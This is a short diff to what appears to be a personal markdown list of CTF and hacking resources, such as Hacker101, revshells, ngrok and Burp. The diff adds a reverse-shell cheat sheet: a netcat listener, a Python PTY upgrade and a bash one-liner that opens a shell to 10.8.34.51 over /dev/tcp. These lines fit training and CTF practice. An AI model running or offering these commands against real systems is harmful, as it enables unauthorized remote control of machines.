@@ -32,9 +32,14 @@
   - [Hacker101](https://www.hacker101.com/)
   - [Codeby Games](https://codeby.games/categories)
 
-shell revers
+# shell revers
   - [revshell](https://www.revshells.com/)
-  - [ngrok](https://ngrok.com/
+  - [ngrok](https://ngrok.com/)
+  python -c 'import pty;pty.spawn("/bin/bash")'
+  nc -lvnp 9999
+  sh -i >& /dev/tcp/10.8.34.51/9999 0>&1
+
+
 
   
 ## Download Burp
